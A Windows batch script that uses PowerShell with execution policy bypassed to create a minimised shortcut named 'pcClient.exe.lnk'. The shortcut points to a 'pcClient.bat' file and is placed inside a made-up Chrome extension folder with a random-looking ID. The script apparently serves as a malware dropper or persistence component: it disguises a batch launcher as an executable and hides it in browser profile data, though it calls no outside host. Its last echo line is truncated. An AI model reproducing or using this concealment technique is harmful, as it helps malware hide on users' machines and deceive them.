@echo off
set "LNK_NAME=pcClient.exe"
set "TARGET_PATH=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht\pcClient.bat"
set "START_IN=%TEMP%"
set "DEST_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht"
set "WINDOW_STYLE=7"  REM 7 = Minimized, 1 = Normal, 3 = Maximized
set "TEMP_LNK=%TEMP%\%LNK_NAME%.lnk"
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%TEMP_LNK%');$s.TargetPath='%TARGET_PATH%';$s.WorkingDirectory='%START_IN%';$s.WindowStyle=%WINDOW_STYLE%;$s.Save()"
move /Y "%TEMP_LNK%" "%DEST_DIR%\%LNK_NAME%.lnk"
echo Shortcut created: %DEST_DIR%\%LNK_NAME%.ln
pause